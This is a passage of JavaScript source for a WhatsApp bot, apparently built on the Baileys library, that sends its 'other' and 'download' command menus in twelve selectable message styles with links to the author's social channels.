                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'othermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${othermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'downloadmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${downloadmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'groupmenu': {
